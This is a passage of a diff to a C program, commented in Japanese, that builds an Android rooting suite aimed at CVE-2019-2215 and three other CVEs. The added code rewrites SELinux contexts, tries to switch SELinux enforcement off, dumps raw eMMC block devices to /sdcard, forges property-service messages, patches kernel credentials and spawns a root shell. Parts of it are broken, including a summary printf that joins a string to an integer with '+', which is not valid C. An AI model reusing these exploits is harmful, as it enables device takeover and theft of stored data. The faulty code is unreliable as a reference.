+   ============================================================ */
+static int try_selinux_methods(void) {
+    printf("[*] Trying SELinux context rewrite...\n");
+
+    const char *ctxs[] = {
+        "u:r:system_app:s0",
+        "u:r:platform_app:s0",
+        "u:r:system_server:s0",
+        "u:r:init:s0",
+        "u:r:kernel:s0",
+        NULL
+    };
+
+    const char *files[] = {
+        "/proc/self/attr/current",
+        "/proc/self/attr/keycreate",
+        "/proc/self/attr/exec",
+        "/proc/self/attr/fscreate",
+        NULL
+    };
+
+    for (int fi = 0; files[fi] != NULL; fi++) {
+        int fd = open(files[fi], O_WRONLY);
+        if (fd < 0) continue;
+        for (int ci = 0; ctxs[ci] != NULL; ci++) {
+            lseek(fd, 0, SEEK_SET);
+            ssize_t n = write(fd, ctxs[ci], strlen(ctxs[ci]));
+            if (n == (ssize_t)strlen(ctxs[ci])) {
+                printf("  [+] %s changed to %s\n", files[fi], ctxs[ci]);
+                close(fd);
+                return 0;
+            }
+        }
+        close(fd);
+    }
+
+    // /sys/fs/selinux/enforce を書き換え
+    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
+    if (fd >= 0) {
+        if (write(fd, "0", 1) == 1) {
+            printf("  [+] SELinux disabled!\n");
+            close(fd);
+            return 0;
+        }
+        close(fd);
+    }
+
+    return -1;
+}
+
+/* ============================================================
+   手法: ブロックデバイスダンプ (権限があれば)
+   ============================================================ */
+static void dump_block_devices(void) {
+    printf("[*] Attempting to dump block devices...\n");
+
+    DIR *dir = opendir("/dev/block");
+    if (!dir) {
+        perror("  opendir /dev/block");
+        return;
+    }
+
+    struct dirent *entry;
+    int count = 0;
+    while ((entry = readdir(dir)) != NULL && count < MAX_PARTITIONS) {
+        if (strncmp(entry->d_name, "mmcblk", 6) == 0) {
+            char path[256], outpath[256];
+            snprintf(path, sizeof(path), "/dev/block/%s", entry->d_name);
+            snprintf(outpath, sizeof(outpath), "/sdcard/dump_%s.bin", entry->d_name);
+
+            int fd = open(path, O_RDONLY);
+            if (fd < 0) {
+                printf("  [-] Cannot open %s\n", path);
+                continue;
+            }
+
+            int out = open(outpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (out < 0) {
+                close(fd);
+                continue;
+            }
+
+            char buf[4096];
+            ssize_t n;
+            size_t total = 0;
+            printf("  [+] Dumping %s -> %s\n", path, outpath);
+            while ((n = read(fd, buf, sizeof(buf))) > 0) {
+                if (write(out, buf, n) != n) break;
+                total += n;
+                if (total >= DUMP_MAX_SIZE) break;
+            }
+            close(fd);
+            close(out);
+            printf("  [+] Dumped %zu bytes\n", total);
+            count++;
+        }
+    }
+    closedir(dir);
+}
+
+/* ============================================================
+   手法: システムプロパティ操作
+   ============================================================ */
+static int try_property_methods(void) {
+    printf("[*] Trying system property operations...\n");
+
+    // /dev/socket/property_service 経由で setprop
     int fd = open("/dev/socket/property_service", O_RDWR);
     if (fd < 0) {
         perror("  open property_service");
         return -1;
     }
 
-    // 簡易的なプロパティ設定（実際には正しいプロトコルが必要）
-    // ここではダミー
+    // 簡易的なプロパティ設定試行
+    const char *prop = "persist.test.poc";
+    const char *value = "1";
+    size_t total = 4 + strlen(prop) + 1 + 4 + strlen(value) + 1;
+    uint8_t *data = malloc(total);
+    if (!data) {
+        close(fd);
+        return -1;
+    }
+
+    size_t off = 0;
+    // コマンド 2 (setprop)
+    data[off++] = 0x02; data[off++] = 0x00; data[off++] = 0x00; data[off++] = 0x00;
+    // 名前
+    size_t plen = strlen(prop) + 1;
+    data[off++] = (uint8_t)(plen & 0xFF);
+    data[off++] = (uint8_t)((plen >> 8) & 0xFF);
+    data[off++] = (uint8_t)((plen >> 16) & 0xFF);
+    data[off++] = (uint8_t)((plen >> 24) & 0xFF);
+    memcpy(data + off, prop, plen);
+    off += plen;
+    // 値
+    size_t vlen = strlen(value) + 1;
+    data[off++] = (uint8_t)(vlen & 0xFF);
+    data[off++] = (uint8_t)((vlen >> 8) & 0xFF);
+    data[off++] = (uint8_t)((vlen >> 16) & 0xFF);
+    data[off++] = (uint8_t)((vlen >> 24) & 0xFF);
+    memcpy(data + off, value, vlen);
+
+    ssize_t n = write(fd, data, total);
+    free(data);
     close(fd);
+
+    if (n == (ssize_t)total) {
+        printf("  [+] Property set attempted\n");
+        return 0;
+    }
+
     return -1;
 }
 
 /* ============================================================
-   情報収集
+   手法: /proc 経由の情報収集
    ============================================================ */
-static void gather_info(void) {
+static void gather_proc_info(void) {
+    printf("[*] Gathering /proc information...\n");
+
+    const char *files[] = {
+        "/proc/self/status",
+        "/proc/self/stat",
+        "/proc/self/attr/current",
+        "/proc/self/capability",
+        "/proc/self/oom_score_adj",
+        "/proc/self/limits",
+        "/proc/self/mounts",
+        NULL
+    };
+
+    for (int i = 0; files[i] != NULL; i++) {
+        int fd = open(files[i], O_RDONLY);
+        if (fd < 0) continue;
+        char buf[1024] = {0};
+        ssize_t n = read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        if (n > 0) {
+            char *line = strtok(buf, "\n");
+            while (line) {
+                if (strstr(line, "Uid:") || strstr(line, "Gid:") ||
+                    strstr(line, "Cap") || strstr(line, "oom")) {
+                    printf("  %s\n", line);
+                }
+                line = strtok(NULL, "\n");
+            }
+        }
+    }
+}
+
+/* ============================================================
+   手法: 最終 root 確認とシェル起動
+   ============================================================ */
+static int final_root_check(void) {
+    if (getuid() == 0) {
+        printf("\n[+] ========================================\n");
+        printf("[+] SUCCESS: Running as root (UID=0)!\n");
+        printf("[+] ========================================\n\n");
+
+        system("id");
+        system("echo '=== ROOT ACCESS ACHIEVED ===' > /data/local/tmp/root.txt");
+        system("id >> /data/local/tmp/root.txt");
+        system("ps -Z >> /data/local/tmp/root.txt");
+        system("getenforce >> /data/local/tmp/root.txt");
+        system("ls -la /data/local/tmp/root.txt");
+
+        // root シェル起動試行
+        pid_t pid = fork();
+        if (pid == 0) {
+            setuid(0);
+            setgid(0);
+            execl("/system/bin/sh", "sh", NULL);
+            exit(1);
+        } else if (pid > 0) {
+            int status;
+            waitpid(pid, &status, 0);
+        }
+
+        g_root_achieved = 1;
+        return 0;
+    }
+
+    printf("\n[-] Still running as UID=%d\n", getuid());
+    return -1;
+}
+
+/* ============================================================
+   情報収集（全体）
+   ============================================================ */
+static void gather_system_info(void) {
     int fd;
     char buf[4096];
+
+    printf("[INFO] === System Information ===\n");
 
     fd = open("/proc/version", O_RDONLY);
     if (fd >= 0) {
@@ -541,7 +980,7 @@ static void gather_info(void) {
         close(fd);
         if (n > 0) {
             buf[n] = '\0';
-            printf("[INFO] Kernel: %s\n", buf);
+            printf("  Kernel: %s", buf);
         }
     }
 
@@ -551,77 +990,176 @@ static void gather_info(void) {
         close(fd);
         if (n > 0) {
             buf[n] = '\0';
-            printf("[INFO] SELinux enforcing: %s\n", buf);
+            printf("  SELinux enforcing: %s\n", buf);
         }
     }
 
-    // seccomp 状態
     int sc = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
     if (sc < 0) {
-        printf("[INFO] seccomp: unknown (prctl failed)\n");
+        printf("  seccomp: unknown\n");
     } else if (sc == 0) {
-        printf("[INFO] seccomp: disabled\n");
+        printf("  seccomp: disabled\n");
     } else if (sc == 2) {
-        printf("[INFO] seccomp: enabled (filter)\n");
+        printf("  seccomp: enabled (filter)\n");
     } else {
-        printf("[INFO] seccomp: mode %d\n", sc);
+        printf("  seccomp: mode %d\n", sc);
     }
 
-    printf("[INFO] UID: %d, GID: %d\n", getuid(), getgid());
+    printf("  UID: %d, GID: %d, EUID: %d, EGID: %d\n",
+           getuid(), getgid(), geteuid(), getegid());
+
+    // /proc/self/status から詳細
+    fd = open("/proc/self/status", O_RDONLY);
+    if (fd >= 0) {
+        ssize_t n = read(fd, buf, sizeof(buf)-1);
+        close(fd);
+        if (n > 0) {
+            buf[n] = '\0';
+            char *line = strtok(buf, "\n");
+            while (line) {
+                if (strstr(line, "Uid:") || strstr(line, "Gid:") ||
+                    strstr(line, "Cap") || strstr(line, "Seccomp")) {
+                    printf("  %s\n", line);
+                }
+                line = strtok(NULL, "\n");
+            }
+        }
+    }
+
+    // ケイパビリティ
+    struct __user_cap_header_struct cap_header = {
+        _LINUX_CAPABILITY_VERSION_3, 0
+    };
+    struct __user_cap_data_struct cap_data[2] = {{0}};
+    if (capget(&cap_header, cap_data) == 0) {
+        printf("  Capabilities: eff=0x%llx, perm=0x%llx, inh=0x%llx\n",
+               (unsigned long long)cap_data[0].effective,
+               (unsigned long long)cap_data[0].permitted,
+               (unsigned long long)cap_data[0].inheritable);
+    }
+
+    printf("[INFO] === End System Information ===\n\n");
 }
 
 /* ============================================================
    main
    ============================================================ */
 int main(void) {
-    int success = 0;
+    int cve_2019_2023_handle = -1;
+    int cve_2215_ok = 0;
+    int method_success = 0;
 
     printf("==================================================\n");
-    printf("  Multi-Method Privilege Escalation Suite\n");
+    printf("  Unified CVE Exploitation Suite v3.0\n");
+    printf("  (CVE-2019-2215, 2020-0041, 2020-0423, 2019-2023)\n");
     printf("==================================================\n\n");
 
     bind_cpu();
-    gather_info();
-    printf("\n");
+    gather_system_info();
 
-    // 1. サービス登録
-    if (register_fake_service() < 0) {
-        printf("[-] Service registration failed, continuing anyway...\n");
+    // ===== CVE-2019-2023 =====
+    printf("[PHASE 1] CVE-2019-2023\n");
+    cve_2019_2023_handle = exploit_cve_2019_2023();
+
+    // ===== CVE-2020-0041 =====
+    printf("\n[PHASE 2] CVE-2020-0041\n");
+    test_cve_2020_0041();
+
+    // ===== CVE-2020-0423 =====
+    printf("\n[PHASE 3] CVE-2020-0423\n");
+    test_cve_2020_0423();
+
+    // ===== CVE-2019-2215 =====
+    printf("\n[PHASE 4] CVE-2019-2215\n");
+    int cred_off = -1, al_off = -1;
+    if (leak_kernel_pointer(&cred_off, &al_off) == 0) {
+        cve_2215_ok = 1;
+        printf("  [+] Kernel pointer leaked successfully\n");
+
+        if (setup_kernel_rw() == 0) {
+            if (patch_kernel_cred() == 0) {
+                printf("  [+] Kernel cred patched!\n");
+                if (getuid() == 0) {
+                    printf("  [+] Already root after kernel patch!\n");
+                    final_root_check();
+                    return 0;
+                }
+            }
+        }
+    } else {
+        printf("  [-] CVE-2019-2215 leak failed\n");
     }
 
-    // 全手法を順次実行
-    printf("\n[*] === Starting privilege escalation attempts ===\n\n");
+    // ===== 多角的エスカレーション =====
+    printf("\n[PHASE 5] Multi-method privilege escalation\n");
+    printf("  (Fallback methods if kernel exploit failed)\n\n");
 
-    if (try_setuid_methods() == 0) success++;
-    if (try_capset_method() == 0) success++;
-    if (try_execve_methods() == 0) success++;
-    if (try_unshare_method() == 0) success++;
-    if (try_ptrace_methods() == 0) success++;
-    if (try_selinux_rewrite() == 0) success++;
-    if (try_uid_map_method() == 0) success++;
-    if (try_execve_direct() == 0) success++;
-    if (try_binder_command_injection() == 0) success++;
-    if (try_setprop_method() == 0) success++;
+    // 実行順序を最適化
+    int methods[] = {
+        1, // setuid系
+        2, // capset
+        3, // execve
+        4, // unshare
+        5, // ptrace
+        6, // selinux
+        7, // property
+        8  // dump
+    };
 
-    // 最終確認
-    printf("\n[*] === Final verification ===\n");
-    if (getuid() == 0) {
-        printf("[+] SUCCESS: Now running as root (UID=0)!\n");
-        system("id");
-        system("echo 'ROOT ACCESS ACHIEVED' > /data/local/tmp/root.txt");
-        printf("[+] Proof written to /data/local/tmp/root.txt\n");
-    } else {
-        printf("[-] Still running as UID=%d\n", getuid());
-        if (success > 0) {
-            printf("[!] Some methods partially succeeded but root not achieved.\n");
-        } else {
-            printf("[-] All methods failed.\n");
+    for (int mi = 0; mi < sizeof(methods)/sizeof(methods[0]); mi++) {
+        if (g_root_achieved) break;
+
+        switch(methods[mi]) {
+            case 1:
+                if (try_all_setuid_methods() == 0) method_success++;
+                break;
+            case 2:
+                if (try_capset_method() == 0) method_success++;
+                break;
+            case 3:
+                if (try_all_execve_methods() == 0) method_success++;
+                break;
+            case 4:
+                if (try_unshare_method() == 0) method_success++;
+                break;
+            case 5:
+                if (try_ptrace_methods() == 0) method_success++;
+                break;
+            case 6:
+                if (try_selinux_methods() == 0) method_success++;
+                break;
+            case 7:
+                if (try_property_methods() == 0) method_success++;
+                break;
+            case 8:
+                dump_block_devices();
+                break;
+        }
+
+        // 毎回 root チェック
+        if (getuid() == 0) {
+            g_root_achieved = 1;
+            break;
         }
     }
 
+    // ===== 情報収集 =====
+    printf("\n[PHASE 6] Information gathering\n");
+    gather_proc_info();
+
+    // ===== 最終確認 =====
+    printf("\n[PHASE 7] Final verification\n");
+    final_root_check();
+
+    // ===== サマリー =====
     printf("\n==================================================\n");
-    printf("  %d methods reported success\n", success);
+    printf("  Summary:\n");
+    printf("    CVE-2019-2023: %s\n", cve_2019_2023_handle >= 0 ? "SUCCESS (handle=" + cve_2019_2023_handle + ")" : "FAILED");
+    printf("    CVE-2019-2215: %s\n", cve_2215_ok ? "LEAKED" : "FAILED");
+    printf("    Method successes: %d\n", method_success);
+    printf("    Root achieved: %s\n", g_root_achieved ? "YES" : "NO");
+    printf("    Final UID: %d\n", getuid());
     printf("==================================================\n");
 
-    return 0;
+    return g_root_achieved ? 0 : 1;
 }
